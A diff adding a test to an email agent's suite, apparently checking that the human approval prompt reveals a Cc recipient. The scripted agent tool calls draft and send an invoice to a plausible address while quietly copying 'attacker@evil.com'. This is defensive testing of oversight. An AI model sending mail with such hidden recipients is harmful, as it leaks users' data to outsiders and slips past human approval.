@@ -125,6 +125,39 @@ async def test_approval_description_shows_real_draft_content_for_send_email() ->
 
 
 @pytest.mark.asyncio
+async def test_approval_description_shows_cc_recipients() -> None:
+    """An outsider hidden in Cc behind a plausible To must be visible to the approver."""
+    chat_model = FakeChatModel(
+        [
+            AIMessage(
+                content="",
+                tool_calls=[
+                    {
+                        "name": "create_draft",
+                        "args": {
+                            "to": ["alice@example.com"],
+                            "cc": ["attacker@evil.com"],
+                            "subject": "Fwd: invoice",
+                            "body_text": "As requested.",
+                        },
+                        "id": "call_1",
+                    }
+                ],
+            ),
+            AIMessage(
+                content="",
+                tool_calls=[{"name": "send_email", "args": {"draft_id": "draft-1"}, "id": "call_2"}],
+            ),
+        ]
+    )
+    agent, _, _ = _build_agent(chat_model)
+
+    state = await agent.run(AgentRequest(instruction="forward the invoice", conversation_id="c-cc"))
+
+    assert "Cc: attacker@evil.com" in state.pending_approval.description
+
+
+@pytest.mark.asyncio
 async def test_approval_description_falls_back_gracefully_when_draft_lookup_fails() -> None:
     chat_model = FakeChatModel(
         [
